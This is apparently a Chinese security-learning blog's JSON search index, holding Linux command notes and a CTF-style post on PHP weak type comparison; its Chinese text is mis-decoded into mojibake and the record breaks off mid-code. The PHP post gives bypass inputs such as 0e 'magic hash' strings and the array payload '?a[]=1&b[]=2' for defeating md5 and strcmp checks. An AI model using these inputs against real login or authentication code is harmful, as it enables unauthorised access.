{"meta":{"title":"æ½œå¿ƒ","subtitle":"","description":"","author":"flag2020","url":"https://flag2020.top","root":"/"},"pages":[{"title":"Oh>..< æ— æ³•è®¿é—®!","date":"2020-10-19T12:43:14.051Z","updated":"2020-10-18T03:43:51.595Z","comments":true,"path":"404.html","permalink":"https://flag2020.top/404.html","excerpt":"","text":"#no{ position: relative; top: 30%; left: 50%; -webkit-transform: translate(-50%, 32%); -moz-transform: translate(-50%, 32%); -ms-transform: translate(-50%, 32%); -o-transform: translate(-50%, 32%); transform: translate(-50%, 32%); font-size: 24px; line-height: 72px; margin-bottom: 36px; white-space: nowrap; text-overflow: ellipsis; overflow: hidden; } 404 Oh>..< æˆ‘æ‰¾ä¸åˆ°å›žå®¶çš„è·¯äº†"},{"title":"about","date":"2019-11-25T10:59:00.000Z","updated":"2020-10-19T14:42:51.519Z","comments":true,"path":"about.html","permalink":"https://flag2020.top/about.html","excerpt":"","text":"å…³äºŽ æœ¬åšå®¢ä¸»é¢˜æ¥è‡ª https://shen-yu.gitee.io/ ä¸€ä¸ªå®‰é™ä¸”ä¼˜é›…çš„ Hexo ä¸»é¢˜ GitHubï¼šhttps://github.com/Shen-Yu/hexo-theme-ayer"},{"title":"about","date":"2019-11-25T10:59:00.000Z","updated":"2020-10-19T13:00:26.348Z","comments":true,"path":"about.html","permalink":"https://flag2020.top/about.html","excerpt":"","text":"å…³äºŽ æœ¬åšå®¢ä¸»é¢˜æ¥è‡ª https://shen-yu.gitee.io/ ä¸€ä¸ªå®‰é™ä¸”ä¼˜é›…çš„ Hexo ä¸»é¢˜ GitHubï¼šhttps://github.com/Shen-Yu/hexo-theme-ayer"},{"title":"æ—¶é—´è½´","date":"2020-05-10T03:33:00.000Z","updated":"2020-10-18T03:43:51.596Z","comments":true,"path":"axis.html","permalink":"https://flag2020.top/axis.html","excerpt":"","text":"æ—¶é—´è½´ åŠ è½½ä¸­â€¦â€¦ if(n){ åŠ è½½å¤±è´¥ã€‚}"},{"title":"å‹æƒ…é“¾æŽ¥","date":"2019-11-25T10:59:00.000Z","updated":"2020-10-18T03:43:51.596Z","comments":true,"path":"link.html","permalink":"https://flag2020.top/link.html","excerpt":"","text":"å‹æƒ…é“¾æŽ¥ åŠ è½½ä¸­â€¦. if(n){ åŠ è½½å¤±è´¥ã€‚}"},{"title":"ç•™è¨€æ¿","date":"2019-11-25T10:59:00.000Z","updated":"2020-10-18T07:59:34.518Z","comments":true,"path":"valine.html","permalink":"https://flag2020.top/valine.html","excerpt":"","text":"ç•™è¨€æ¿ï¼Œè¯·å¤§ä½¬ä»»æ„å‘ç‚Žå¦‚æžœæœ‰ä»€ä¹ˆé—®é¢˜æˆ–è€…åé¦ˆéƒ½å¯ä»¥å‘é€åœ¨è¯„è®ºåŒºæ·»åŠ å‹æƒ…é“¾æŽ¥ä¼ é€å¸¦"},{"title":"categories","date":"2020-11-11T16:47:02.379Z","updated":"2020-11-11T16:47:02.379Z","comments":true,"path":"categories/index.html","permalink":"https://flag2020.top/categories/index.html","excerpt":"","text":""},{"title":"friends","date":"2020-11-11T16:45:50.007Z","updated":"2020-11-11T16:45:50.007Z","comments":true,"path":"friends/index.html","permalink":"https://flag2020.top/friends/index.html","excerpt":"","text":""},{"title":"tags","date":"2020-11-11T16:48:42.729Z","updated":"2020-11-11T16:48:14.888Z","comments":true,"path":"tags/index.html","permalink":"https://flag2020.top/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"å­¦ä¹ ç¬”è®°â€”â€”Linux","slug":"å­¦ä¹ ç¬”è®°â€”â€”Linux","date":"2020-11-12T14:00:00.000Z","updated":"2020-11-12T14:10:05.292Z","comments":true,"path":"2020/11/12/å­¦ä¹ ç¬”è®°â€”â€”Linux/","link":"","permalink":"https://flag2020.top/2020/11/12/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94Linux/","excerpt":"Linuxæ˜¯å¼€æºçš„æ“ä½œç³»ç»Ÿï¼Œç³»ç»Ÿç‰¹ç‚¹æœ‰ï¼šå¼€æ”¾æ€§ï¼ˆå¼€æºï¼‰ã€å¤šç”¨æˆ·ã€å¤šä»»åŠ¡ã€è‰¯å¥½çš„ç”¨æˆ·ç•Œé¢ã€ä¼˜å¼‚çš„æ€§èƒ½ä¸Žç¨³å®šæ€§ç­‰ç­‰ã€‚ å­¦ä¹ ç¬”è®°ç›®å½•ï¼š æ–‡ä»¶ç›®å½•ç»“æž„ ç»ˆç«¯ è·¯å¾„ æŒ‡ä»¤","text":"Linuxæ˜¯å¼€æºçš„æ“ä½œç³»ç»Ÿï¼Œç³»ç»Ÿç‰¹ç‚¹æœ‰ï¼šå¼€æ”¾æ€§ï¼ˆå¼€æºï¼‰ã€å¤šç”¨æˆ·ã€å¤šä»»åŠ¡ã€è‰¯å¥½çš„ç”¨æˆ·ç•Œé¢ã€ä¼˜å¼‚çš„æ€§èƒ½ä¸Žç¨³å®šæ€§ç­‰ç­‰ã€‚ å­¦ä¹ ç¬”è®°ç›®å½•ï¼š æ–‡ä»¶ç›®å½•ç»“æž„ ç»ˆç«¯ è·¯å¾„ æŒ‡ä»¤ æ–‡ä»¶ç›®å½•ç»“æž„ binï¼šå…¨ç§°binaryï¼Œå«ä¹‰æ˜¯äºŒè¿›åˆ¶ã€‚è¯¥ç›®å½•ä¸­å­˜å‚¨çš„éƒ½æ˜¯ä¸€äº›äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œæ–‡ä»¶éƒ½æ˜¯å¯ä»¥è¢«è¿è¡Œçš„ã€‚ devï¼šè¯¥ç›®å½•ä¸­ä¸»è¦å­˜æ”¾çš„æ˜¯å¤–æŽ¥è®¾å¤‡ï¼Œä¾‹å¦‚ç›˜ã€å…¶ä»–çš„å…‰ç›˜ç­‰ã€‚åœ¨å…¶ä¸­çš„å¤–æŽ¥è®¾å¤‡æ˜¯ä¸èƒ½ç›´æŽ¥è¢«ä½¿ç”¨çš„ï¼Œéœ€è¦æŒ‚è½½ï¼ˆç±»ä¼¼windowsä¸‹çš„åˆ†é…ç›˜ç¬¦ï¼‰ã€‚ etcï¼šè¯¥ç›®å½•ä¸»è¦å­˜å‚¨ä¸€äº›é…ç½®æ–‡ä»¶ã€‚ homeï¼šè¡¨ç¤ºâ€œå®¶â€ï¼Œè¡¨ç¤ºé™¤äº†rootç”¨æˆ·ä»¥å¤–å…¶ä»–ç”¨æˆ·çš„å®¶ç›®å½•ï¼Œç±»ä¼¼äºŽwindowsä¸‹çš„User/ç”¨æˆ·ç›®å½•ã€‚ mntï¼šå½“å¤–æŽ¥è®¾å¤‡éœ€è¦æŒ‚è½½çš„æ—¶å€™ï¼Œå°±éœ€è¦æŒ‚è½½åˆ°mntç›®å½•ä¸‹ã€‚ procï¼šprocessï¼Œè¡¨ç¤ºè¿›ç¨‹ï¼Œè¯¥ç›®å½•ä¸­å­˜å‚¨çš„æ˜¯Linuxè¿è¡Œæ—¶å€™çš„è¿›ç¨‹ã€‚ rootï¼šè¯¥ç›®å½•æ˜¯rootç”¨æˆ·è‡ªå·±çš„å®¶ç›®å½•ã€‚ sbinï¼šå…¨ç§°super binaryï¼Œè¯¥ç›®å½•ä¹Ÿæ˜¯å­˜å‚¨ä¸€äº›å¯ä»¥è¢«æ‰§è¡Œçš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä½†æ˜¯å¿…é¡»å¾—æœ‰superæƒé™çš„ç”¨æˆ·æ‰èƒ½æ‰§è¡Œã€‚ tmpï¼šè¡¨ç¤ºâ€œä¸´æ—¶â€çš„ï¼Œå½“ç³»ç»Ÿè¿è¡Œæ—¶å€™äº§ç”Ÿçš„ä¸´æ—¶æ–‡ä»¶ä¼šåœ¨è¿™ä¸ªç›®å½•å­˜ç€ã€‚ usrï¼šå­˜æ”¾çš„æ˜¯ç”¨æˆ·è‡ªå·±å®‰è£…çš„è½¯ä»¶ã€‚ç±»ä¼¼äºŽwindowsä¸‹çš„program filesã€‚ varï¼šå­˜æ”¾çš„ç¨‹åº/ç³»ç»Ÿçš„æ—¥å¿—æ–‡ä»¶çš„ç›®å½•ã€‚ ç»ˆç«¯ kaliï¼šå½“å‰ç»ˆç«¯ç™»å½•çš„ç”¨æˆ·å @ï¼šå‘éŸ³atï¼Œè¡¨ç¤ºâ€åœ¨â€œ kaliï¼šå½“å‰ç™»å½•çš„ä¸»æœºå ~/æ¡Œé¢ï¼šå½“å‰ç»ˆç«¯çš„å·¥ä½œç›®å½• $ï¼šèº«ä»½è¯†åˆ«ç¬¦ï¼Œå¦‚æžœæ˜¯è¶…çº§ç®¡ç†å‘˜ç™»å½•åˆ™æ˜¾ç¤º#ï¼Œå¦åˆ™æ˜¾ç¤º$ç¬¦å· è¶…çº§ç®¡ç†å‘˜ç»ˆç«¯ç•Œé¢å¦‚ä¸‹ï¼š è·¯å¾„è·¯å¾„å¯ä»¥åˆ†ä¸ºä¸¤ç§ï¼šç›¸å¯¹è·¯å¾„å’Œç»å¯¹è·¯å¾„ ç›¸å¯¹è·¯å¾„ï¼š ./ï¼šè¡¨ç¤ºå½“å‰ç›®å½•ä¸‹ï¼›../ï¼šè¡¨ç¤ºå½“å‰ç›®å½•ä¸‹ ç»å¯¹è·¯å¾„ï¼š /ï¼šä»Žæ ¹ç›®å½•ä¸‹å¯»æ‰¾å¯¹åº”è·¯å¾„ åœ¨Linuxä¸­æœ‰ä¸€ä¸ªç‰¹æ®Šçš„ç¬¦å·â€œ~â€ï¼Œè¡¨ç¤ºå½“å‰ç”¨æˆ·çš„å®¶ç›®å½•ã€‚ æŒ‡ä»¤LinuxæŒ‡ä»¤é€šç”¨æ ¼å¼ #æŒ‡ä»¤ä¸»ä½“ï¼ˆç©ºæ ¼ï¼‰ [é€‰é¡¹]ï¼ˆç©ºæ ¼ï¼‰ [æ“ä½œå¯¹è±¡] ä¸€ä¸ªæŒ‡ä»¤å¯ä»¥åŒ…å«å¤šä¸ªé€‰é¡¹ æ“ä½œå¯¹è±¡ä¹Ÿå¯ä»¥æ˜¯å¤šä¸ª ls(list) ls åˆ—å‡ºå½“å‰å·¥ä½œç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶/æ–‡ä»¶å¤¹çš„åç§° ls è·¯å¾„ åˆ—å‡ºæŒ‡å®šè·¯å¾„ä¸‹çš„æ‰€æœ‰æ–‡ä»¶/æ–‡ä»¶å¤¹çš„åç§° ls é€‰é¡¹ è·¯å¾„ ls -l è·¯å¾„ -lï¼šè¡¨ç¤ºlistï¼Œè¡¨ç¤ºä»¥è¯¦ç»†åˆ—è¡¨çš„å½¢å¼è¿›è¡Œå±•ç¤º ls -a è·¯å¾„ -aï¼šè¡¨ç¤ºæ˜¾ç¤ºæ‰€æœ‰çš„æ–‡ä»¶/æ–‡ä»¶å¤¹ï¼ˆåŒ…å«äº†éšè—æ–‡ä»¶/æ–‡ä»¶å¤¹ï¼‰ ls -lh è·¯å¾„ -lhï¼š-aï¼šè¡¨ç¤ºæ˜¾ç¤ºæ‰€æœ‰çš„æ–‡ä»¶/æ–‡ä»¶å¤¹ï¼ˆåŒ…å«äº†éšè—æ–‡ä»¶/æ–‡ä»¶å¤¹ï¼‰ pwd(print working directory) pwd æ‰“å°å½“å‰å·¥ä½œç›®å½• cd(change directory) cd è·¯å¾„ åˆ‡æ¢åˆ°è·¯å¾„æ‰€åœ¨ç›®å½• mkdir(make directory) mkdir è·¯å¾„ åˆ›å»ºç›®å½•ï¼Œå¯ä»¥æ˜¯æ–‡ä»¶å¤¹åç§°ä¹Ÿå¯ä»¥æ˜¯åŒ…å«åç§°çš„ä¸€ä¸ªå®Œæ•´è·¯å¾„ mkdir -p è·¯å¾„ å½“ä¸€æ¬¡æ€§åˆ›å»ºå¤šå±‚ä¸å­˜åœ¨çš„ç›®å½•çš„æ—¶å€™ï¼Œæ·»åŠ -på‚æ•°ï¼Œå¦åˆ™ä¼šæŠ¥é”™ mkdir è·¯å¾„1 è·¯å¾„2 è·¯å¾„3 â€¦ è¡¨ç¤ºä¸€æ¬¡æ€§åˆ›å»ºå¤šä¸ªç›®å½• touchåˆ›å»ºæ–‡ä»¶ touch æ–‡ä»¶è·¯å¾„ æ–‡ä»¶è·¯å¾„å¯ä»¥æ˜¯ç›´æŽ¥çš„æ–‡ä»¶åä¹Ÿå¯ä»¥æ˜¯è·¯å¾„ï¼Œtouchä¹Ÿå¯ä»¥åŒæ—¶åˆ›å»ºå¤šä¸ªæ–‡ä»¶ clear clear æ¸…å± cp(copy) cp è¢«å¤åˆ¶çš„æ–‡æ¡£è·¯å¾„ æ–‡æ¡£è¢«å¤åˆ¶åˆ°çš„è·¯å¾„ å¤åˆ¶æ–‡æ¡£åˆ°æ–°è·¯å¾„ä¸‹çš„ä½ç½®ï¼Œåœ¨å¤åˆ¶è¿‡ç¨‹ä¸­æ˜¯å¯ä»¥å¯¹æ–°ä½ç½®çš„æ–‡ä»¶é‡å‘½åçš„ cp -r è¢«å¤åˆ¶çš„æ–‡ä»¶å¤¹è·¯å¾„ æ–‡ä»¶å¤¹è¢«å¤åˆ¶åˆ°çš„è·¯å¾„ -rè¡¨ç¤ºé€’å½’å¤åˆ¶ mv(move) mv éœ€è¦ç§»åŠ¨çš„æ–‡æ¡£è·¯å¾„ éœ€è¦ä¿å­˜çš„ä½ç½®è·¯å¾„ ç§»åŠ¨æ–‡æ¡£åˆ°æ–°ä½ç½®ï¼ŒåŽŸå§‹æ–‡ä»¶åœ¨ç§»åŠ¨åŽä¸åœ¨åŽŸå§‹ä½ç½® mv éœ€è¦ç§»åŠ¨çš„æ–‡ä»¶å¤¹è·¯å¾„ éœ€è¦ä¿å­˜çš„ä½ç½®è·¯å¾„ ç§»åŠ¨ä¸€ä¸ªæ–‡ä»¶å¤¹ï¼ŒåŒç§»åŠ¨æ–‡æ¡£ æ³¨ï¼š åœ¨Linuxä¸­é‡å‘½åçš„å‘½ä»¤ä¹Ÿæ˜¯mvï¼Œè¯­æ³•å’Œç§»åŠ¨è¯­æ³•ä¸€æ · å¦‚ï¼šé‡å‘½åæ ¹ç›®å½•ä¸‹çš„a.txtä¸ºb.txt mv /a.txt /b.txt rm(remove) rm é€‰é¡¹ éœ€è¦ç§»é™¤çš„æ–‡æ¡£è·¯å¾„ rm -f éœ€è¦ç§»é™¤çš„æ–‡æ¡£è·¯å¾„ forceï¼šè¡¨ç¤ºå¼ºåˆ¶åˆ é™¤ï¼Œä¸æç¤ºæ˜¯å¦åˆ é™¤ rm -r éœ€è¦ç§»é™¤çš„æ–‡ä»¶å¤¹è·¯å¾„ -rï¼šè¡¨ç¤ºé€’å½’ï¼Œåˆ é™¤ä¸€ä¸ªç›®å½•çš„æ—¶å€™éœ€è¦åšé€’å½’åˆ é™¤ï¼Œå¹¶ä¸”ä¸€èˆ¬ä¹Ÿä¸éœ€è¦è¿›è¡Œåˆ é™¤ç¡®è®¤è¯¢é—®ï¼Œæ‰€ä»¥ç§»é™¤ç›®å½•çš„æ—¶å€™ä¸€èˆ¬éœ€è¦ä½¿ç”¨-rfé€‰é¡¹ rm -rf æ–‡æ¡£è·¯å¾„/æ–‡ä»¶å¤¹è·¯å¾„/â€¦ åˆ é™¤å¤šä¸ªæ–‡æ¡£å’Œæ–‡ä»¶å¤¹ æ³¨ï¼š è¦åˆ é™¤ä¸€ä¸ªç›®å½•ä¸‹æœ‰å…¬å…±ç‰¹æ€§çš„æ–‡æ¡£ï¼Œä¾‹å¦‚ä»¥testå¼€å¤´çš„æ–‡æ¡£ï¼Œå¯ä»¥ä½¿ç”¨é€šé…ç¬¦* rm -f test* è¡¨ç¤ºå¼ºåˆ¶åˆ é™¤åªè¦æ–‡ä»¶æ˜¯ä»¥testå¼€å¤´çš„ï¼ŒåŽç»­å­—ç¬¦ä¸ç®¡çš„æ–‡æ¡£ è¾“å‡ºé‡å®šå‘ä¸€èˆ¬å‘½ä»¤çš„è¾“å‡ºéƒ½ä¼šæ˜¾ç¤ºåœ¨ç»ˆç«¯ä¸­ï¼Œæœ‰äº›æ—¶å€™éœ€è¦å°†ä¸€äº›å‘½ä»¤çš„æ‰§è¡Œç»“æžœæƒ³è¦ä¿å­˜åˆ°æ–‡ä»¶ä¸­è¿›è¡ŒåŽç»­çš„åˆ†æž/ç»Ÿè®¡ï¼Œåˆ™è¿™æ—¶å€™éœ€è¦ä½¿ç”¨åˆ°çš„è¾“å‡ºé‡å®šå‘æŠ€æœ¯ã€‚ &gt;ï¼šè¦†ç›–è¾“å‡ºï¼Œä¼šè¦†ç›–æŽ‰åŽŸå…ˆçš„æ–‡ä»¶å†…å®¹ &gt;&gt;ï¼šè¿½åŠ è¾“å‡ºï¼Œä¸ä¼šè¦†ç›–åŽŸå§‹æ–‡ä»¶å†…å®¹ï¼Œä¼šåœ¨åŽŸå§‹å†…å®¹æœ«å°¾ç»§ç»­æ·»åŠ  æ­£å¸¸æ‰§è¡Œçš„æŒ‡ä»¤ &gt;/&gt;&gt; æ–‡ä»¶çš„è·¯å¾„ æ³¨ï¼šæ–‡ä»¶å¯ä»¥ä¸å­˜åœ¨ï¼Œä¸å­˜åœ¨åˆ™æ–°å»º å¦‚ï¼šä½¿ç”¨è¦†ç›–é‡å®šå‘ï¼Œä¿å­˜ ls -lah çš„æ‰§è¡Œç»“æžœåˆ°å½“å‰ç›®å½•ä¸‹çš„ ls.txt ls -lah &gt; ls.txt cat cat æ–‡æ¡£è·¯å¾„ ç›´æŽ¥æ‰“å¼€ä¸€ä¸ªæ–‡æ¡£ï¼Œç»“æžœè¾“å‡ºåœ¨ç»ˆç«¯ cat æ–‡æ¡£è·¯å¾„1 æ–‡æ¡£è·¯å¾„2 â€¦ æ–‡æ¡£è·¯å¾„n &gt; æ–‡æ¡£è·¯å¾„x é…åˆè¾“å‡ºé‡å®šå‘ï¼Œå°†æ–‡æ¡£è·¯å¾„1åˆ°æ–‡æ¡£è·¯å¾„nçš„å†…å®¹åˆå¹¶åˆ°æ–‡æ¡£è·¯å¾„x ç®¡é“ç®¡é“ç¬¦ï¼š| ç®¡é“ä¸€èˆ¬å¯ä»¥ç”¨äºŽâ€œè¿‡æ»¤â€ï¼Œâ€œç‰¹æ®Šâ€ï¼Œâ€œæ‰©å±•å¤„ç†â€ã€‚ æŒ‡ä»¤A | æŒ‡ä»¤B æŒ‡ä»¤Açš„æ­£ç¡®è¾“å‡ºä½œä¸ºæŒ‡ä»¤Bçš„æ“ä½œå¯¹è±¡ grepæŒ‡ä»¤ï¼šä¸»è¦ç”¨äºŽè¿‡æ»¤ du -sh du -sh ç›®å½•è·¯å¾„ æŸ¥çœ‹ç›®å½•çš„çœŸå®žå¤§å° -sï¼šsummariesï¼Œåªæ˜¾ç¤ºæ±‡æ€»çš„å¤§å° -hï¼šè¡¨ç¤ºä»¥é«˜å¯è¯»æ€§çš„å½¢å¼è¿›è¡Œæ˜¾ç¤º å¦‚ï¼šç»Ÿè®¡â€/etcâ€œç›®å½•å®žé™…å¤§å° du -sh /etc/ date %Fï¼šç­‰ä»·äºŽ%Y-%m-%d %Tï¼šç­‰ä»·äºŽ%H:%M:%S 12345678%Fï¼šè¡¨ç¤ºå®Œæ•´çš„å¹´æœˆæ—¥%Tï¼šè¡¨ç¤ºå®Œæ•´çš„æ—¶åˆ†ç§’%Yï¼šè¡¨ç¤ºå››ä½å¹´ä»½%mï¼šè¡¨ç¤ºä¸¤ä½æœˆä»½ï¼ˆå¸¦å‰å¯¼0ï¼‰%dï¼šè¡¨ç¤ºæ—¥æœŸï¼ˆå¸¦å‰å¯¼0ï¼‰%Hï¼šè¡¨ç¤ºå°æ—¶ï¼ˆå¸¦å‰å¯¼0ï¼‰%Mï¼šè¡¨ç¤ºåˆ†é’Ÿï¼ˆå¸¦å‰å¯¼0ï¼‰%Sï¼šè¡¨ç¤ºç§’æ•°ï¼ˆå¸¦å‰å¯¼0ï¼‰","categories":[{"name":"å­¦ä¹ ç¬”è®°","slug":"å­¦ä¹ ç¬”è®°","permalink":"https://flag2020.top/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}],"tags":[{"name":"å­¦ä¹ ç¬”è®°","slug":"å­¦ä¹ ç¬”è®°","permalink":"https://flag2020.top/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"}]},{"title":"PHP å¼±ç±»åž‹æ¯”è¾ƒé—®é¢˜","slug":"PHP å¼±ç±»åž‹æ¯”è¾ƒé—®é¢˜","date":"2020-10-29T15:00:00.000Z","updated":"2020-11-11T15:37:02.697Z","comments":true,"path":"2020/10/29/PHP å¼±ç±»åž‹æ¯”è¾ƒé—®é¢˜/","link":"","permalink":"https://flag2020.top/2020/10/29/PHP%20%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83%E9%97%AE%E9%A2%98/","excerpt":"å­—ç¬¦ä¸²å’Œæ•°å­—æ¯”è¾ƒæ—¶ï¼Œä¼šå…ˆæŠŠå­—ç¬¦ä¸²è½¬æ¢ä¸ºæ•°å­—ï¼Œä¸èƒ½è½¬æ¢ä¸ºæ•°å­—çš„å­—ç¬¦ä¸²æˆ–nullï¼Œè¢«è½¬æ¢ä¸º0ã€‚ bool trueå’Œä»»ä½•æ¯”è¾ƒéƒ½ç›¸ç­‰ï¼Œé™¤äº†0å’Œfalseï¼Œå› ä¸º0è®¤ä¸ºæ˜¯bool falseã€‚ md5æˆ–è€…shaä¸èƒ½åŠ å¯†æ•°ç»„ï¼Œæ‰€ä»¥åœ¨åŠ å¯†æ•°ç»„çš„æ—¶å€™ä¼šè¿”å›žfalseã€‚ â€œ0xâ€å¼€å¤´è·Ÿæ•°å­—çš„å­—ç¬¦ä¸²ï¼ˆä¾‹å¦‚â€0x1e240â€ï¼‰ä¼šè¢«å½“ä½œ16è¿›åˆ¶æ•°åŽ»æ¯”è¾ƒã€‚ åªè¦æ˜¯ä»¥0eå¼€å¤´ï¼ŒåŽé¢ä¸ºæ•°å­—çš„å­—ç¬¦ä¸²å’Œå­—ç¬¦ä¸²0æ¯”è¾ƒå€¼éƒ½æ˜¯ç›¸ç­‰çš„ï¼Œå³0e\\d+çš„å­—ç¬¦ä¸² == â€˜0â€™ ä¸ºtrueã€‚ PHP5.3ä»¥ä¸Šç‰ˆæœ¬çš„strcmp()å­˜åœ¨æ¼æ´žï¼Œåªè¦$_GET[â€˜passwordâ€™]æ˜¯ä¸€ä¸ªæ•°ç»„æˆ–è€…ä¸€ä¸ªobjectå³å¯ç»•è¿‡ã€‚","text":"å­—ç¬¦ä¸²å’Œæ•°å­—æ¯”è¾ƒæ—¶ï¼Œä¼šå…ˆæŠŠå­—ç¬¦ä¸²è½¬æ¢ä¸ºæ•°å­—ï¼Œä¸èƒ½è½¬æ¢ä¸ºæ•°å­—çš„å­—ç¬¦ä¸²æˆ–nullï¼Œè¢«è½¬æ¢ä¸º0ã€‚ bool trueå’Œä»»ä½•æ¯”è¾ƒéƒ½ç›¸ç­‰ï¼Œé™¤äº†0å’Œfalseï¼Œå› ä¸º0è®¤ä¸ºæ˜¯bool falseã€‚ md5æˆ–è€…shaä¸èƒ½åŠ å¯†æ•°ç»„ï¼Œæ‰€ä»¥åœ¨åŠ å¯†æ•°ç»„çš„æ—¶å€™ä¼šè¿”å›žfalseã€‚ â€œ0xâ€å¼€å¤´è·Ÿæ•°å­—çš„å­—ç¬¦ä¸²ï¼ˆä¾‹å¦‚â€0x1e240â€ï¼‰ä¼šè¢«å½“ä½œ16è¿›åˆ¶æ•°åŽ»æ¯”è¾ƒã€‚ åªè¦æ˜¯ä»¥0eå¼€å¤´ï¼ŒåŽé¢ä¸ºæ•°å­—çš„å­—ç¬¦ä¸²å’Œå­—ç¬¦ä¸²0æ¯”è¾ƒå€¼éƒ½æ˜¯ç›¸ç­‰çš„ï¼Œå³0e\\d+çš„å­—ç¬¦ä¸² == â€˜0â€™ ä¸ºtrueã€‚ PHP5.3ä»¥ä¸Šç‰ˆæœ¬çš„strcmp()å­˜åœ¨æ¼æ´žï¼Œåªè¦$_GET[â€˜passwordâ€™]æ˜¯ä¸€ä¸ªæ•°ç»„æˆ–è€…ä¸€ä¸ªobjectå³å¯ç»•è¿‡ã€‚ å­—ç¬¦ä¸² md5() 240610708 0e462097431906509019562988736854 QNKCDZO 0e830400451993494058024219903391 s878926199a 0e545993274517709034328855841020 s155964671a 0e342768416822451524974117254469 s214587387a 0e848240448830537924465865611904 å‚è€ƒï¼š PHPå®˜æ–¹æ‰‹å†Œâ€”â€”æ¯”è¾ƒè¿ç®—ç¬¦ PHP å¼±ç±»åž‹æ¯”è¾ƒæ€»ç»“ PHP å¼±ç±»åž‹æ¯”è¾ƒé—®é¢˜PHPæ˜¯ä¸€é—¨å¼±ç±»åž‹è¯­è¨€ï¼Œå­˜åœ¨å¼±ç±»åž‹æ¯”è¾ƒé—®é¢˜ã€‚ â€œ==â€ä¸Žâ€œ===â€== æ•°æ®ç±»åž‹ä¸ä¸€æ ·çš„æ—¶å€™ä¼šå°†æ•°æ®ç±»åž‹è½¬æ¢ä¸ºç›¸åŒçš„å†è¿›è¡Œæ¯”è¾ƒ === é™¤äº†å¯¹æ•°æ®çš„å€¼è¿›è¡Œæ¯”è¾ƒè¿˜ä¼šå¯¹æ•°æ®çš„ç±»åž‹è¿›è¡Œæ¯”è¾ƒ 123456789&lt;?php$o = $_GET[&#x27;o&#x27;];if(is_numeric($o))&#123; die(&quot;no hack!!&quot;);&#125;if($o==520)&#123; echo &quot;U are right!&quot;;&#125;?&gt; è¾“å…¥520ï¼Œåˆ™ï¼šno hack!! è¾“å…¥520aï¼Œåˆ™ï¼šU are right! 1234&lt;?phpecho intval(&#x27;520a&#x27;).&#x27;&lt;br&gt;&#x27;;echo intval(&#x27;a520&#x27;);?&gt; 520 a 12345&lt;?phpvar_dump(&#x27;1&#x27;==1);echo &quot;&lt;br&gt;&quot;;var_dump(&#x27;1&#x27;===1);?&gt; bool(true)bool(false) 1234&lt;?phpvar_dump(&#x27;0e12&#x27; == &#x27;0e34&#x27;);var_dump(&#x27;0e12&#x27; === &#x27;0e34&#x27;);?&gt; bool(true)bool(false) switchå¼±ç±»åž‹æ¯”è¾ƒé—®é¢˜switchä¸­åŒæ ·å­˜åœ¨å¼±ç±»åž‹æ¯”è¾ƒé—®é¢˜ï¼ŒåŽŸç†å’Œä¸Šé¢ç±»ä¼¼ 12345678910111213&lt;?php $i =&quot;3a&quot;; switch ($i) &#123; case 0: case 1: case 2: echo &quot;this is two&quot;; break; case 3: echo &quot;flag&quot;; break; &#125;?&gt; æœ€ç»ˆè¾“å‡º flag å­—ç¬¦ä¸²å’Œæ•°å­—æ¯”è¾ƒå­—ç¬¦ä¸²å’Œæ•°å­—æ¯”è¾ƒæ—¶ï¼Œä¼šå…ˆæŠŠå­—ç¬¦ä¸²è½¬æ¢ä¸ºæ•°å­—ï¼Œä¸èƒ½è½¬æ¢ä¸ºæ•°å­—çš„å­—ç¬¦ä¸²æˆ–nullï¼Œè¢«è½¬æ¢ä¸º0ã€‚ å¦‚ï¼šâ€aâ€æˆ–â€a1â€æ˜¯ä¸èƒ½è½¬æ¢ä¸ºæ•°å­—çš„å­—ç¬¦ä¸²ï¼Œè€Œâ€1â€æˆ–â€1aâ€æ˜¯å¯ä»¥è½¬æ¢ä¸ºæ•°å­—çš„å­—ç¬¦ä¸² 123456789&lt;?phpvar_dump(&#x27;a&#x27; == 0);var_dump(&#x27;a&#x27; == 1);var_dump(&#x27;1&#x27; == 1);var_dump(&#x27;1a&#x27; == 1);var_dump(&#x27;a1&#x27; == 1);var_dump(&#x27;12a&#x27; == 1);?&gt; bool(true)bool(false)bool(true)bool(true)bool(false)bool(false) å¸ƒå°”å€¼trueå’Œä»»æ„æ¯”è¾ƒbool trueå’Œä»»ä½•æ¯”è¾ƒéƒ½ç›¸ç­‰ï¼Œé™¤äº†0å’Œfalseï¼Œå› ä¸º0è®¤ä¸ºæ˜¯bool falseã€‚ 123456&lt;?phpvar_dump(true == 0);var_dump(true == &#x27;False&#x27;);var_dump(true == 2);var_dump(true == &#x27;2&#x27;);?&gt; bool(false)bool(true)bool(true)bool(true) md5()ã€sha1()å“ˆå¸Œå‡½æ•°ç›¸ç­‰é—®é¢˜123456789101112&lt;?phpif (isset($_GET[&#x27;a&#x27;]) and isset($_GET[&#x27;b&#x27;]))&#123; if ($_GET[&#x27;a&#x27;] != $_GET[&#x27;b&#x27;]) &#123; if (md5($_GET[&#x27;a&#x27;]) === md5($_GET[&#x27;b&#x27;])) echo &#x27;flag&#x27;; else echo &#x27;Wrong&#x27;; &#125;&#125;?&gt; è¦å¾—åˆ°flagï¼Œå¾—æƒ³åŠžæ³•è®©aå’Œbçš„å€¼ä¸ç›¸ç­‰ï¼Œä½†md5åŠ å¯†åŽçš„å€¼ç›¸ç­‰ã€‚ ç”±äºŽmd5æˆ–è€…shaä¸èƒ½åŠ å¯†æ•°ç»„ï¼Œæ‰€ä»¥åœ¨åŠ å¯†æ•°ç»„çš„æ—¶å€™ä¼šè¿”å›žfalseã€‚ åˆ©ç”¨è¿™ç‚¹ï¼Œç»™aå’Œbåˆ†åˆ«ä¼ å‚ä¸¤ä¸ªä¸åŒçš„æ•°ç»„ï¼Œå°±å¯ä»¥å¾—åˆ°flagã€‚ 1?a[]&#x3D;1&amp;b[]&#x3D;2 åå…­è¿›åˆ¶æ¯”è¾ƒé—®é¢˜123456789101112131415161718192021&lt;?phpfunction fun($number)&#123; $one = ord(&#x27;1&#x27;); $nine = ord(&#x27;9&#x27;); for ($i = 0; $i &lt; strlen($number); $i++) &#123; $digit = ord($number&#123;$i&#125;); if ( ($digit &gt;= $one) &amp;&amp; ($digit 